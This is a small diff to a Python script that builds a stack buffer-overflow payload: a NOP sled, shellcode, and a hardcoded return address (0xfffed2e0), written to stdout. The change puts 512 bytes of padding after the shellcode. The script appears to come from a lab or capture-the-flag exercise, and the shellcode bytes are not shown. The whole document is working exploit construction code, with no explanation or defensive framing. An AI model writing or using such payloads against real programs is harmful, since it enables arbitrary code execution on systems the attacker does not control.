@@ -8,8 +8,9 @@ from struct import pack
 pad = 1024 + 12
 shellcode_addr = 0xfffed2e0
 
-payload = b'\x90' * (pad - len(shellcode))
+payload = b'\x90' * (pad - len(shellcode)-512)
 payload += shellcode
+payload += b'\x90' * (512)
 payload += pack('<I', shellcode_addr)
 
 sys.stdout.buffer.write(payload)
